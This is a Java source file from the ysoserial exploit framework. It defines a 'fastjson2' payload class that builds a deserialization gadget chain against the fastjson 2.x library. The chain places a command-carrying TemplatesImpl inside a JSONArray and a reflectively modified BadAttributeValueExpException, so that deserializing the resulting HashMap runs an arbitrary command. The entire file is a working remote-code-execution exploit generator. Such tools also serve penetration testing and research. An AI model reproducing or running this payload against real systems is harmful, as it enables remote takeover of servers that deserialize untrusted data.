package ysoserial.payloads;

import com.alibaba.fastjson2.JSONArray;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:2.x"})
@Authors({Authors.ERR0R233})
public class fastjson2 extends PayloadRunner implements ObjectPayload<Object>  {
    public Object getObject(final String command) throws Exception{
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templatesImpl);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templatesImpl, badAttributeValueExpException);
        return hashMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(fastjson2.class, args);
    }
}
